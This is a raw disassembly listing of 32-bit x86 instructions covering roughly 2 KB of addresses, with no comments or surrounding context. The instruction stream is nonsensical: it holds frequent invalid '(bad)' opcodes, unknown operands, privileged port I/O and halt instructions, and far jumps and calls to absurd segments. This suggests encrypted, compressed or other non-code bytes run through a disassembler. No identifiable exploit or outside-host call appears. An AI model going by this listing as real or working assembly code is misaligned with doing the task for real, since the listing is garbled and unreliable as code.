  402fce:	(bad)  
  402fcf:	fistp  DWORD PTR ss:[edi]
  402fd2:	or     al,0xec
  402fd4:	or     eax,0x72c1c5ef
  402fd9:	push   ecx
  402fda:	cmc    
  402fdb:	push   es
  402fdc:	mov    edi,0xbfb4da62
  402fe1:	sbb    al,0xc3
  402fe3:	sbb    DWORD PTR [ebx-0x5c],ebp
  402fe6:	aaa    
  402fe7:	popa   
  402fe8:	mov    ch,0x0
  402fea:	xchg   ecx,eax
  402feb:	pop    esp
  402fec:	mov    edi,0x4e955eaf
  402ff1:	mov    dl,0x8
  402ff3:	cmc    
  402ff4:	daa    
  402ff5:	mov    ds:0x1c4c5cdb,eax
  402ffa:	mov    cl,0x54
  402ffc:	push   0x1a
  402ffe:	fcomi  st,st(4)
  403000:	and    cl,BYTE PTR [ecx-0x59]
  403003:	inc    esp
  403004:	ret    
  403005:	rol    eax,0xfe
  403008:	xor    al,0xa5
  40300a:	call   0xacbd4991
  40300f:	std    
  403010:	ret    0x1984
  403013:	lds    edx,FWORD PTR [ecx-0x64]
  403016:	push   ss
  403017:	sbb    eax,0xa2f6f3af
  40301c:	mov    ?,WORD PTR [ecx]
  40301e:	and    al,0xb
  403020:	add    DWORD PTR [edx-0x69217636],0x64
  403027:	pusha  
  403028:	pop    esi
  403029:	(bad)  
  40302a:	cwde   
  40302b:	cdq    
  40302c:	add    eax,0xddbacef7
  403031:	xor    BYTE PTR [edx+0x52],bl
  403034:	mov    bh,dl
  403036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403037:	add    DWORD PTR [esi+0x3f],0xffffff84
  40303b:	cld    
  40303c:	and    edx,DWORD PTR [edx]
  40303e:	ret    0x1d0c
  403041:	fs pop edi
  403043:	xchg   edi,eax
  403044:	lock sub eax,0x1ec311db
  40304a:	push   ecx
  40304b:	mov    cl,0xab
  40304d:	or     BYTE PTR [ebx-0x2ce8afb6],dh
  403053:	mov    bl,0xc9
  403055:	push   ebx
  403056:	pop    esp
  403057:	cmc    
  403058:	push   ebp
  403059:	hlt    
  40305a:	(bad)  
  40305b:	or     al,BYTE PTR [edx]
  40305d:	js     0x40308b
  40305f:	ds pop ebp
  403061:	pop    esi
  403062:	jge    0x403070
  403064:	push   esp
  403065:	xor    DWORD PTR [ecx+esi*2+0x68],esi
  403069:	das    
  40306a:	mov    edi,0xa55c337f
  40306f:	jne    0x4030ef
  403071:	sub    al,0x58
  403073:	or     dh,0x93
  403076:	stos   DWORD PTR es:[edi],eax
  403077:	dec    ebp
  403078:	push   edi
  403079:	xor    BYTE PTR [ebx-0x50],bh
  40307c:	jae    0x4030d1
  40307e:	in     al,dx
  40307f:	inc    edi
  403080:	ret    0x9c88
  403083:	jmp    0xd26d2007
  403088:	cs jbe 0x403045
  40308b:	int    0x8a
  40308d:	shl    BYTE PTR [esi+0x4e8f948e],0x2a
  403094:	push   0x75
  403096:	xchg   edi,edx
  403098:	xlat   BYTE PTR ds:[ebx]
  403099:	sar    BYTE PTR [bp+di+0x7584],0x4c
  40309f:	retf   
  4030a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030a1:	xchg   BYTE PTR [ebx],ah
  4030a3:	call   0x26578247
  4030a8:	icebp  
  4030a9:	(bad)  
  4030aa:	lock aad 0x79
  4030ad:	or     BYTE PTR [eax-0x7f69a7cb],bl
  4030b3:	sti    
  4030b4:	clc    
  4030b5:	cmp    al,0xaa
  4030b7:	je     0x4030f3
  4030b9:	js     0x4030cb
  4030bb:	data16 xor bh,ch
  4030be:	lahf   
  4030bf:	mov    ebx,0x8122257d
  4030c4:	cmp    eax,0xaf9cea54
  4030c9:	cld    
  4030ca:	(bad)  
  4030cb:	jecxz  0x403087
  4030cd:	jl     0x4030df
  4030cf:	add    BYTE PTR fs:[eax+0x2884b08c],bh
  4030d6:	push   es
  4030d7:	repnz xchg ebp,eax
  4030d9:	in     al,0xe6
  4030db:	fild   QWORD PTR [edx-0xc]
  4030de:	rcr    BYTE PTR [edx],1
  4030e0:	dec    esp
  4030e1:	popf   
  4030e2:	ret    
  4030e3:	and    esi,DWORD PTR [eax+edi*1]
  4030e6:	scas   al,BYTE PTR es:[edi]
  4030e7:	jnp    0x4030f6
  4030e9:	iret   
  4030ea:	pusha  
  4030eb:	dec    ecx
  4030ec:	pushf  
  4030ed:	and    ebx,edx
  4030ef:	retf   0x3487
  4030f2:	addr16 inc ecx
  4030f4:	sbb    bh,dh
  4030f6:	and    BYTE PTR ds:[ebp+0x64],bh
  4030fa:	mov    ecx,0xa654f661
  4030ff:	clc    
  403100:	adc    ch,cl
  403102:	push   ebp
  403103:	in     eax,dx
  403104:	push   ds
  403105:	test   DWORD PTR [ebx],esi
  403107:	sub    eax,0x9d0d2993
  40310c:	add    ecx,ebp
  40310e:	pop    ss
  40310f:	xchg   edx,eax
  403110:	xchg   BYTE PTR [ecx],bh
  403112:	fsubr  QWORD PTR [edx-0x149d0946]
  403118:	dec    DWORD PTR [esi-0x43849012]
  40311e:	dec    ebx
  40311f:	push   es
  403120:	sbb    ecx,eax
  403122:	out    dx,eax
  403123:	pop    ds
  403124:	rcr    BYTE PTR [eax+0x41dd1486],0xf8
  40312b:	sbb    DWORD PTR [edi-0x47e582d2],edi
  403131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403132:	xchg   ebp,eax
  403133:	and    al,0xc0
  403135:	mov    DWORD PTR [ecx+0x0],ebx
  403138:	sub    eax,0xcf0e005
  40313d:	mov    BYTE PTR [edx+eiz*1-0x30a56b1f],cl
  403144:	sub    cl,BYTE PTR [ebp+0x28673df3]
  40314a:	inc    ebx
  40314b:	ja     0x403174
  40314d:	je     0x4031c2
  40314f:	loopne 0x40314c
  403151:	cmp    DWORD PTR [eax-0x33],esi
  403154:	mov    cl,bh
  403156:	jl     0x40314d
  403158:	push   0x2
  40315a:	aas    
  40315b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40315c:	dec    eax
  40315d:	lahf   
  40315e:	and    esp,DWORD PTR [ebp+0x3c]
  403161:	and    edi,DWORD PTR [ecx-0x4d]
  403164:	xor    ah,BYTE PTR [ebp-0x4cc1c529]
  40316a:	rol    BYTE PTR [esi-0x58],cl
  40316d:	outs   dx,DWORD PTR ds:[esi]
  40316e:	ja     0x403113
  403170:	dec    edx
  403171:	pop    edx
  403172:	jbe    0x4031e4
  403174:	scas   al,BYTE PTR es:[edi]
  403175:	inc    eax
  403176:	(bad)  
  403177:	repnz pop es
  403179:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40317a:	xchg   esp,eax
  40317b:	mov    BYTE PTR [edi],ch
  40317d:	xchg   BYTE PTR [eax],bh
  40317f:	test   eax,0x1f563a2a
  403184:	(bad)  
  403185:	mov    esp,0xb6ea5f86
  40318a:	stos   BYTE PTR es:[edi],al
  40318b:	pop    ds
  40318c:	xor    al,0x66
  40318e:	mov    DWORD PTR [esi-0x61b888e6],ebp
  403194:	cmp    ecx,DWORD PTR [edi]
  403196:	dec    ebx
  403197:	pop    edi
  403198:	sub    al,0x85
  40319a:	push   esi
  40319b:	mov    al,ds:0x16b53891
  4031a0:	je     0x4031ae
  4031a2:	cmp    esi,ecx
  4031a4:	fwait
  4031a5:	jmp    0xfe45:0x8d7f62b0
  4031ac:	clc    
  4031ad:	hlt    
  4031ae:	test   BYTE PTR [edi+0x4c6692],dl
  4031b4:	repz jmp 0xb572:0xc7cf72b2
  4031bc:	xchg   BYTE PTR [edx-0x7b7f45c6],al
  4031c2:	aas    
  4031c3:	fdiv   DWORD PTR [ebx+0x4a]
  4031c6:	push   0x23
  4031c8:	scas   al,BYTE PTR es:[edi]
  4031c9:	cli    
  4031ca:	fs lahf 
  4031cc:	xchg   esp,eax
  4031cd:	int3   
  4031ce:	and    ah,BYTE PTR [esi+0xd]
  4031d1:	add    eax,0x2fc01ffa
  4031d6:	inc    ecx
  4031d7:	test   eax,0xc4b93395
  4031dc:	inc    esp
  4031dd:	jge    0x403179
  4031df:	mov    ch,0xcb
  4031e1:	mov    edi,0x4691b9db
  4031e6:	inc    edx
  4031e7:	mov    edx,0x8c1f5df7
  4031ec:	mov    al,0x92
  4031ee:	cmp    al,0x61
  4031f0:	stos   BYTE PTR es:[edi],al
  4031f1:	cmp    al,0x9e
  4031f3:	sbb    DWORD PTR [eax+eax*1],0xffffff9c
  4031f7:	aam    0x6c
  4031f9:	clc    
  4031fa:	cmp    esi,edi
  4031fc:	popf   
  4031fd:	jmp    0x8ff015b5
  403202:	xlat   BYTE PTR ds:[ebx]
  403203:	shr    DWORD PTR ds:0x6620fdab,0x37
  40320a:	aas    
  40320b:	ret    
  40320c:	sbb    ah,bl
  40320e:	xchg   esi,eax
  40320f:	lods   eax,DWORD PTR ds:[esi]
  403210:	cmc    
  403211:	in     al,0x29
  403213:	or     eax,0x184cbdc2
  403218:	and    ch,ah
  40321a:	icebp  
  40321b:	(bad)  
  40321c:	xor    ebx,eax
  40321e:	(bad)
  403221:	mov    esi,0xfd20f1dc
  403226:	and    al,0x4
  403228:	sbb    esp,ecx
  40322a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40322b:	push   ebp
  40322c:	pop    ebx
  40322d:	or     DWORD PTR [edx+ebp*4-0x2e],eax
  403231:	nop
  403232:	dec    edi
  403233:	and    DWORD PTR [ecx+eiz*4+0x26],edx
  403237:	repnz stos DWORD PTR es:[edi],eax
  403239:	sbb    bl,bl
  40323b:	mov    dh,0x84
  40323d:	mov    edx,0x7a1009a7
  403242:	mov    eax,0xcc5ccf8b
  403247:	sub    al,0x63
  403249:	xor    ebx,esi
  40324b:	and    cl,BYTE PTR ds:0x4cdd9a24
  403251:	inc    edx
  403252:	sar    BYTE PTR [ebx-0x4],0xc2
  403256:	test   DWORD PTR [edi-0x6d],edx
  403259:	jns    0x4032a4
  40325b:	int3   
  40325c:	test   eax,0x3ca89b0c
  403261:	jb     0x403265
  403263:	popf   
  403264:	xchg   esp,eax
  403265:	jle    0x4032a3
  403267:	mov    edi,ds
  403269:	sahf   
  40326a:	push   edx
  40326b:	(bad)  
  40326c:	fadd   QWORD PTR [ebx-0x76]
  40326f:	iret   
  403270:	inc    esi
  403271:	pop    eax
  403272:	stos   BYTE PTR es:[edi],al
  403273:	sbb    BYTE PTR [eax],dl
  403275:	call   0xc8d5:0xd4a1d4f1
  40327c:	xchg   edi,eax
  40327d:	retf   
  40327e:	rcr    DWORD PTR [eax],1
  403280:	mov    esi,0x4b161483
  403285:	xor    al,BYTE PTR [bx+0x1e7a]
  40328a:	or     ecx,DWORD PTR [eax+0x73]
  40328d:	sbb    BYTE PTR [edx-0x4e],ch
  403290:	cmp    BYTE PTR [ebx-0x2],dl
  403293:	repz mov ah,al
  403296:	nop
  403297:	mov    al,0xa6
  403299:	js     0x4032ae
  40329b:	repz xchg ecx,eax
  40329d:	push   ebp
  40329e:	dec    edx
  40329f:	xor    BYTE PTR [edx+0x58df6382],0xcb
  4032a6:	mov    edx,0xaaad6088
  4032ab:	std    
  4032ac:	adc    eax,0x3c50fdbd
  4032b1:	adc    al,0x9b
  4032b3:	push   0x17951c7b
  4032b8:	rol    eax,cl
  4032ba:	push   cs
  4032bb:	sub    eax,0xb43dba62
  4032c0:	cmp    BYTE PTR [edi+eiz*2],bh
  4032c3:	fldcw  WORD PTR [esp+ebp*1-0x10]
  4032c7:	sti    
  4032c8:	inc    edx
  4032c9:	jbe    0x4032ff
  4032cb:	mov    ch,0x1e
  4032cd:	inc    ebx
  4032ce:	gs inc ecx
  4032d0:	aaa    
  4032d1:	retf   
  4032d2:	push   esi
  4032d3:	mov    esi,0x151450c9
  4032d8:	mov    dh,ch
  4032da:	into   
  4032db:	xor    BYTE PTR [ebx+ebp*8],dh
  4032de:	add    dl,BYTE PTR [ebx+eax*4-0x6c9f605f]
  4032e5:	bound  edi,QWORD PTR ds:0x5f1a2fe3
  4032eb:	mov    al,ds:0xe1fdbeed
  4032f0:	xchg   esi,eax
  4032f1:	sbb    al,0xa0
  4032f3:	pop    es
  4032f4:	dec    esi
  4032f5:	and    BYTE PTR [ecx],dl
  4032f7:	int    0x2b
  4032f9:	gs in  al,0x63
  4032fc:	mov    al,ds:0xa3f6196e
  403301:	jg     0x403350
  403303:	lds    esi,FWORD PTR [edx-0x4c]
  403306:	imul   ebp,DWORD PTR [edi-0x3ada6aa6],0x12a5a535
  403310:	pop    ebp
  403311:	shr    BYTE PTR [esi],cl
  403313:	es push es
  403315:	(bad)  
  403316:	clc    
  403317:	repnz (bad) 
  403319:	(bad)  
  40331b:	daa    
  40331c:	xchg   BYTE PTR [esi-0x212cb2a2],ch
  403322:	mov    ecx,0x8ab66e64
  403327:	pop    ecx
  403328:	call   0x6dfa395b
  40332d:	inc    esi
  40332e:	out    0xc2,eax
  403330:	mov    DWORD PTR [esi-0x19],0xa48dd2b1
  403337:	xor    ebp,eax
  403339:	inc    edi
  40333a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40333b:	bound  ecx,QWORD PTR [ebx-0x3038072d]
  403341:	or     bh,BYTE PTR [ebp-0x36]
  403344:	hlt    
  403345:	or     al,BYTE PTR [eax+0x3d]
  403348:	add    al,0x8e
  40334a:	mov    al,0xdc
  40334c:	aaa    
  40334d:	test   BYTE PTR [esi+0x33],0xaa
  403351:	ds call 0xdb99:0xca59fa3
  403359:	scas   eax,DWORD PTR es:[edi]
  40335a:	nop
  40335b:	hlt    
  40335c:	mov    BYTE PTR [esi+0x28b5949b],ah
  403362:	push   esi
  403363:	cmc    
  403364:	(bad)  
  403365:	hlt    
  403366:	cmp    al,0xea
  403368:	ror    DWORD PTR [ebx+0x714ad08e],cl
  40336e:	fwait
  40336f:	in     eax,dx
  403370:	jbe    0x40330f
  403372:	addr16 and al,0xaf
  403375:	jns    0x4033ec
  403377:	enter  0x28ad,0x97
  40337b:	pop    ebx
  40337c:	imul   eax,DWORD PTR [edx],0xaead4355
  403382:	or     BYTE PTR [edx-0x1750b857],al
  403388:	sub    DWORD PTR [ecx+0x41],ecx
  40338b:	push   ebx
  40338c:	rcr    BYTE PTR [ebx],0xd4
  40338f:	xchg   edx,eax
  403390:	xor    DWORD PTR [edx+0x6c],0x71
  403394:	das    
  403395:	scas   eax,DWORD PTR es:[edi]
  403396:	clc    
  403397:	push   ds
  403398:	out    0xf7,eax
  40339a:	push   ecx
  40339b:	xor    BYTE PTR [ecx-0x29551c28],dl
  4033a1:	stos   BYTE PTR es:[edi],al
  4033a2:	stos   DWORD PTR es:[edi],eax
  4033a3:	retf   0xa7eb
  4033a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033a7:	imul   ecx,DWORD PTR [ebp+0x4e],0x37b80143
  4033ae:	mov    DWORD PTR [ebp-0x58],esi
  4033b1:	je     0x403413
  4033b3:	rcr    BYTE PTR [edx],cl
  4033b5:	add    BYTE PTR [eax+0x56],dh
  4033b8:	xchg   edx,eax
  4033b9:	sub    eax,DWORD PTR [edi]
  4033bb:	cmc    
  4033bc:	rcr    DWORD PTR ds:0x53fc7fa4,cl
  4033c2:	cmc    
  4033c3:	inc    ecx
  4033c4:	int3   
  4033c5:	jbe    0x403361
  4033c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033c8:	xchg   BYTE PTR [esi],al
  4033ca:	push   eax
  4033cb:	mov    edx,0xbe71fd50
  4033d0:	mov    DWORD PTR [ecx],ebp
  4033d2:	test   eax,0x645460a6
  4033d7:	jne    0x403454
  4033d9:	out    0x91,al
  4033db:	rcl    DWORD PTR [esi-0x3cdcc187],0x1c
  4033e2:	push   eax
  4033e3:	mov    esi,0x5424268a
  4033e8:	cmovle esi,DWORD PTR [ecx-0x16]
  4033ec:	or     DWORD PTR [edx+0x72c5df47],eax
  4033f2:	xor    edx,DWORD PTR [edi-0x697bbee4]
  4033f8:	ds lock ret 
  4033fb:	xchg   edi,eax
  4033fc:	adc    al,dl
  4033fe:	inc    ebp
  4033ff:	add    DWORD PTR [ebx-0x28bfcd6f],ecx
  403405:	push   ebp
  403406:	mov    ?,ebp
  403408:	lods   al,BYTE PTR ds:[esi]
  403409:	add    bh,BYTE PTR [eax]
  40340b:	les    esp,FWORD PTR [edx+0x67dd5461]
  403411:	inc    esi
  403412:	repz not BYTE PTR [esi]
  403415:	xchg   edi,eax
  403416:	imul   ebp,DWORD PTR [esi-0x465887f2],0xc3557cfe
  403420:	and    DWORD PTR [ebp-0x58],ecx
  403423:	adc    al,0xcb
  403425:	sub    bl,dh
  403427:	cdq    
  403428:	outs   dx,BYTE PTR ds:[esi]
  403429:	nop
  40342a:	pop    ebp
  40342b:	out    0x1,eax
  40342d:	mov    al,0x67
  40342f:	jns    0x403421
  403431:	cmp    eax,0xb953270d
  403436:	test   BYTE PTR [esi],ah
  403438:	gs dec edi
  40343a:	add    al,0xab
  40343c:	loopne 0x4033dd
  40343e:	mov    WORD PTR [edi+0x4b],?
  403441:	leave  
  403442:	test   al,0x8c
  403444:	dec    eax
  403445:	(bad)  
  403446:	pop    edi
  403447:	call   0x1a1d:0xe549adc2
  40344e:	jb     0x4033d0
  403450:	cmc    
  403451:	pinsrw mm1,WORD PTR [edx-0x2f],0xcf
  403456:	idiv   DWORD PTR [edx]
  403458:	push   eax
  403459:	sub    BYTE PTR cs:[eax],ah
  40345c:	xor    BYTE PTR [ebp-0x23],ch
  40345f:	or     DWORD PTR [edi+0x7d],ecx
  403462:	jo     0x40340e
  403464:	add    DWORD PTR [edx-0x544f0e31],ebx
  40346a:	out    0x17,al
  40346c:	add    al,0x5
  40346e:	je     0x403486
  403470:	hlt    
  403471:	out    dx,al
  403472:	push   ecx
  403473:	xor    BYTE PTR [esp+ecx*8-0x55439646],bl
  40347a:	fs (bad) 
  40347c:	or     BYTE PTR [esi],ch
  40347e:	outs   dx,DWORD PTR ds:[esi]
  40347f:	jg     0x40349b
  403481:	aam    0x2e
  403483:	popa   
  403484:	push   esi
  403485:	add    ebp,DWORD PTR [eax-0x355bf61]
  40348b:	sbb    al,0x9d
  40348d:	arpl   dx,si
  40348f:	stos   BYTE PTR es:[edi],al
  403490:	jecxz  0x40350b
  403492:	and    esi,DWORD PTR [eax+0x41]
  403495:	loopne 0x403453
  403497:	inc    ebp
  403498:	push   eax
  403499:	loop   0x4034c7
  40349b:	inc    esp
  40349c:	mov    esp,0xd21bdaf4
  4034a1:	cmp    esi,eax
  4034a3:	mov    dl,0xfb
  4034a5:	push   ss
  4034a6:	retf   
  4034a7:	(bad)  
  4034a9:	inc    ebp
  4034aa:	mov    BYTE PTR [esi+0x3d],bl
  4034ad:	out    dx,eax
  4034ae:	add    dl,bh
  4034b0:	bound  edi,QWORD PTR [edi]
  4034b2:	jg     0x40348e
  4034b4:	cmp    esi,DWORD PTR [edx-0x138ab67e]
  4034ba:	xchg   esi,eax
  4034bb:	sbb    BYTE PTR [esi],dh
  4034bd:	fs (bad) 
  4034bf:	enter  0x8ea9,0x20
  4034c3:	dec    edx
  4034c4:	aaa    
  4034c5:	inc    edx
  4034c6:	sahf   
  4034c7:	mov    ebx,0x130a647
  4034cc:	cmp    DWORD PTR [esi-0x48],esi
  4034cf:	ss mov ebp,ebx
  4034d2:	and    dl,BYTE PTR [eax-0x3d]
  4034d5:	cmp    eax,0x6732416c
  4034da:	into   
  4034db:	add    DWORD PTR [ecx+0x6c],ebx
  4034de:	mov    WORD PTR [eax],ss
  4034e0:	in     al,dx
  4034e1:	cmp    BYTE PTR [edi+0x66],bl
  4034e4:	add    edi,DWORD PTR [esi-0x6e6847dd]
  4034ea:	sbb    eax,0x55ef372f
  4034ef:	xor    DWORD PTR [edx-0xa],esi
  4034f2:	out    dx,eax
  4034f3:	call   0xfcef:0x1dce9a69
  4034fa:	test   DWORD PTR [edi],edx
  4034fc:	xor    al,0x88
  4034fe:	add    eax,0x7671e4a0
  403503:	sub    al,0x80
  403505:	push   DWORD PTR [ebx+0x1b]
  403508:	cli    
  403509:	and    BYTE PTR [ecx-0x6cc1a6f],0x69
  403510:	fsubr  QWORD PTR [eax+0x70]
  403513:	mov    edx,DWORD PTR [ebx+0x7]
  403516:	push   eax
  403517:	jo     0x4034ed
  403519:	aam    0xa9
  40351b:	(bad)  
  40351c:	xchg   esi,eax
  40351d:	addr16 out dx,al
  40351f:	pushf  
  403520:	div    BYTE PTR [ebx]
  403522:	mov    ds:0x91f8542a,al
  403527:	mov    esi,0xca76ced6
  40352c:	gs int 0x96
  40352f:	push   es
  403530:	mov    al,ds:0x34f794f6
  403535:	repz dec esi
  403537:	test   DWORD PTR [edx+ebx*8+0x108c52fd],ecx
  40353e:	xchg   DWORD PTR [edx+0x7f],esp
  403541:	out    0x45,eax
  403543:	mov    esi,DWORD PTR [edx+esi*8+0x5d]
  403547:	lea    ebp,[esi-0x2f]
  40354a:	mov    esp,0xdb80ebd6
  40354f:	xchg   esp,eax
  403550:	add    cl,BYTE PTR [ebx]
  403552:	in     eax,0x10
  403554:	nop
  403555:	or     ch,al
  403557:	rcr    DWORD PTR [ebx+0x103b4fd9],0xa
  40355e:	and    BYTE PTR [ebx-0x71],bh
  403561:	jle    0x403561
  403563:	mov    edi,0xda93c93a
  403568:	xchg   edx,eax
  403569:	pop    esp
  40356a:	fwait
  40356b:	pop    ds
  40356c:	ins    DWORD PTR es:[edi],dx
  40356d:	cmp    BYTE PTR [ebx+0x21978a8a],ch
  403573:	lods   al,BYTE PTR ds:[esi]
  403574:	pop    ecx
  403575:	in     eax,dx
  403576:	popa   
  403577:	lods   eax,DWORD PTR ds:[esi]
  403578:	jl     0x40352a
  40357a:	rcl    BYTE PTR [edi+edi*8-0x60d2a89e],1
  403581:	add    BYTE PTR [ebx-0x60b2dbe4],cl
  403587:	jl     0x403581
  403589:	mov    edx,0x1d0c3ada
  40358e:	fmul   st,st(4)
  403590:	daa    
  403591:	lea    ecx,[ebx]
  403593:	add    ecx,DWORD PTR [eax-0x3301b0d9]
  403599:	and    ch,BYTE PTR [edx]
  40359b:	mov    bh,0x97
  40359d:	mov    ah,0xb0
  40359f:	mov    edx,0x306a451
  4035a4:	daa    
  4035a5:	add    al,0xa2
  4035a7:	mov    edx,0x6d69a16a
  4035ac:	ret    
  4035ad:	inc    ebx
  4035ae:	push   eax
  4035af:	jae    0x40360b
  4035b1:	shl    BYTE PTR [ecx-0x37],1
  4035b4:	or     DWORD PTR [edx+0x2785d0c],ebx
  4035ba:	adc    eax,0x30674789
  4035bf:	mov    esi,0xe28a8ad4
  4035c4:	aaa    
  4035c5:	mov    ebx,0x1426b292
  4035ca:	push   ecx
  4035cb:	pop    edi
  4035cc:	xor    BYTE PTR [edi+0x3cd47aea],bh
  4035d2:	inc    edx
  4035d3:	add    eax,0xcbeb7e35
  4035d8:	mov    ebp,0xa5895acc
  4035dd:	or     BYTE PTR [ebx],dl
  4035df:	fiadd  WORD PTR [ecx-0x4ec1b366]
  4035e5:	fsubr  DWORD PTR [esi+0x429d34b]
  4035eb:	jnp    0x4035ba
  4035ed:	xor    al,0x85
  4035ef:	sbb    dh,BYTE PTR [eax]
  4035f1:	inc    ecx
  4035f2:	push   ss
  4035f3:	mov    al,ds:0x3d129b15
  4035f8:	push   ds
  4035f9:	imul   ecx,ecx,0x4c71d0a6
  4035ff:	mov    ds:0xc6b3bb4b,al
  403604:	or     DWORD PTR [eax],ebp
  403606:	sti    
  403607:	dec    esi
  403608:	dec    esp
  403609:	mov    bh,0x5d
  40360b:	into   
  40360c:	test   BYTE PTR ds:0x46621b4,dh
  403612:	aad    0x24
  403614:	out    dx,al
  403615:	mov    BYTE PTR [ebx+0x3d],ch
  403618:	out    dx,eax
  403619:	in     eax,dx
  40361a:	inc    esi
  40361b:	mov    ecx,0x161edc5f
  403620:	sbb    BYTE PTR [edi+0x27eecc8c],0xca
  403627:	pusha  
  403628:	out    dx,al
  403629:	popa   
  40362a:	add    eax,0x54221567
  40362f:	mov    ss,WORD PTR [eax]
  403631:	mov    DWORD PTR [ebp-0x6d],ebx
  403634:	fiadd  DWORD PTR ds:0x37ea1b24
  40363a:	cmp    DWORD PTR gs:[esi+edx*8-0x6e],edx
  40363f:	push   edx
  403640:	lods   al,BYTE PTR ds:[esi]
  403641:	sbb    dh,bl
  403643:	mov    DWORD PTR [edx],esp
  403645:	aaa    
  403646:	or     DWORD PTR [esi+0x2434f81a],esi
  40364c:	repnz pop esp
  40364e:	cmp    dl,BYTE PTR [edi+0x1c]
  403651:	ds pop edx
  403653:	push   edx
  403654:	sahf   
  403655:	xor    BYTE PTR [ecx-0x12132426],0xce
  40365c:	adc    cl,BYTE PTR [edi-0x5cfbc13d]
  403662:	test   DWORD PTR [ecx+0x5],ebx
  403665:	sub    DWORD PTR [ebx-0x60cfe6f3],ecx
  40366b:	mov    edi,0xc552163f
  403670:	(bad)  
  403671:	sti    
  403672:	dec    edx
  403673:	fsubrp st(6),st
  403675:	xor    DWORD PTR [esi],eax
  403677:	dec    edx
  403678:	mov    esi,DWORD PTR [ecx+0x7ab0bbb8]
  40367e:	enter  0xc216,0x82
  403682:	cmp    eax,0x6f64502a
  403687:	and    dl,BYTE PTR [edx+eiz*1]
  40368a:	cs fs scas eax,DWORD PTR es:[edi]
  40368d:	scas   eax,DWORD PTR es:[edi]
  40368e:	xor    eax,0xb67ad20b
  403693:	pop    ebx
  403694:	xor    eax,0xec063828
  403699:	dec    ebx
  40369a:	cld    
  40369b:	cmp    eax,0x41cd1ab6
  4036a0:	pop    ds
  4036a1:	shr    cl,cl
  4036a3:	xchg   edi,eax
  4036a4:	and    DWORD PTR [eax+0x77],ebp
  4036a7:	icebp  
  4036a8:	repnz and cl,BYTE PTR ds:0x8f2cd
  4036af:	jb     0x4036f5
  4036b1:	or     BYTE PTR [edx+0x5],dh
  4036b4:	sub    esi,esi
  4036b6:	add    DWORD PTR [esi+ecx*2+0x16],0xffffffaa
  4036bb:	xchg   ecx,eax
  4036bc:	int3   
  4036bd:	cli    
  4036be:	pop    ecx
  4036bf:	scas   eax,DWORD PTR es:[edi]
  4036c0:	or     ebp,DWORD PTR [ecx]
  4036c2:	out    0xd5,eax
  4036c4:	std    
  4036c5:	test   BYTE PTR [eax],bh
  4036c7:	(bad)  
  4036c8:	xchg   ebp,eax
  4036c9:	jp     0x40371a
  4036cb:	adc    ebx,DWORD PTR [ebx+0x40]
  4036ce:	adc    DWORD PTR [ecx],0x8880c5b5
  4036d4:	jle    0x403736
  4036d6:	pop    edi
  4036d7:	fwait
  4036d8:	add    ebx,edi
  4036da:	fst    QWORD PTR [edi+edi*4+0x50]
  4036de:	xchg   ebp,eax
  4036df:	sub    BYTE PTR [esi+0x4a],0x88
  4036e3:	cmp    esp,DWORD PTR [edi]
  4036e5:	mov    bl,0xb9
  4036e7:	and    eax,0xfe45d7bc
  4036ec:	pusha  
  4036ed:	mov    eax,ds:0xbaa3768a
  4036f2:	mov    eax,0xea7b81ba
  4036f7:	aad    0x8b
  4036f9:	loopne 0x403776
  4036fb:	cmp    bh,cl
  4036fd:	or     ecx,ecx
  4036ff:	(bad)  
  403700:	jae    0x403696
  403702:	mov    ebp,0x85ba4d0d
  403707:	lea    edi,[ecx-0x79]
  40370a:	es push 0xffffffe0
  40370d:	push   cs
  40370e:	pop    ebp
  40370f:	push   ebp
  403710:	(bad)  
  403711:	or     DWORD PTR [eax+0x218219a2],0x57a8234
  40371b:	add    eax,0x709c8006
  403720:	lahf   
  403721:	fistp  WORD PTR es:[ecx+0x47c36f3e]
  403728:	mov    DWORD PTR ss:[eax-0x41ea2d51],ecx
  40372f:	das    
  403730:	dec    esp
  403731:	push   0x73ea991c
  403736:	mov    dh,0x8f
  403738:	in     eax,dx
  403739:	push   0xffffffe1
  40373b:	jmp    0x942c:0xafd61b01
  403742:	sub    BYTE PTR [edi],ch
  403744:	lds    esp,FWORD PTR [edi+esi*8+0x16]
  403748:	les    ebp,FWORD PTR [ecx-0x2c490c16]
  40374e:	mov    DWORD PTR [esi],ebx
  403750:	xchg   esp,eax
  403751:	dec    eax
  403752:	sar    DWORD PTR [edi-0x3dc07561],0x83
  403759:	add    dh,BYTE PTR [edx-0x3b9fb86c]
  40375f:	iret   
  403760:	pusha  
  403761:	push   ecx
  403762:	mov    ecx,ebx
  403764:	mov    ebp,0x8466b59a
  403769:	dec    ecx
  40376a:	dec    esi
  40376b:	xor    al,0x86
  40376d:	pusha  
  40376e:	xchg   edx,eax
  40376f:	ins    BYTE PTR es:[di],dx
  403771:	mov    edx,0x8590615
  403776:	jnp    0x403729
  403778:	pop    es
  403779:	sbb    DWORD PTR [ebx-0x1e427a4e],ebp
  40377f:	xchg   edi,eax
  403780:	leave  
  403781:	ins    BYTE PTR es:[edi],dx
  403782:	(bad)  
  403784:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403785:	push   0x5d
  403787:	inc    ebp
  403788:	fimul  DWORD PTR [ebx-0x2a]
  40378b:	sub    dl,BYTE PTR [ebx]
  40378d:	xchg   ecx,eax
  40378e:	or     BYTE PTR [edx-0x52ee3d9],dl
  403794:	inc    ebx
  403795:	shr    BYTE PTR [edi+0x17],1
  403798:	cmp    bl,BYTE PTR [eax+0x3]
  40379b:	and    al,0x9d
  40379d:	jle    0x4037ee
  40379f:	mov    bl,0xbc
  4037a1:	adc    eax,0x45567879
  4037a6:	or     bh,BYTE PTR [esi+0x12f8f7d4]
  4037ac:	(bad)  
  4037ad:	retf   0x89a6
  4037b0:	sbb    eax,0x16fcb76d
  4037b5:	xor    edx,eax
  4037b7:	pop    edx
  4037b8:	std    
  4037b9:	xchg   esi,eax
  4037ba:	mov    esp,0xf7179c9f
  4037bf:	mov    ebp,0xe2299496
  4037c4:	xchg   edi,eax
